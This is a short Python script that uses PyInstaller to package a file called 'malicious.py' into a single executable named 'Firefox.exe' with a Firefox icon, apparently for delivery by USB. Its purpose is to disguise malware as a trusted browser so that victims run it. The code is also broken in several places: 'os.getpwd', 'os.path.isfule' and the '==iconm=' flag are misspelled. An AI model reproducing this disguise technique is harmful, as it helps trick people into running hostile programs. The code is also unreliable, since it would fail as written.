import PyInstaller.__main__
import os, shutil

filename = "malicious.py"
exename = "Firefox.exe"
icon = "Firefox.ico"
pwd = os.getpwd()
usbdir = os.path.join(pwd,"USB")

if os.path.isfule(exename):
    os.remove(exename)

# Create executable from Python script
PyInstaller.__main__.run([
"malicious.py",
"--onefile",
"--clean",
"--log-level=ERROR",
"--name="+exename,
"==iconm="+icon

])

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")
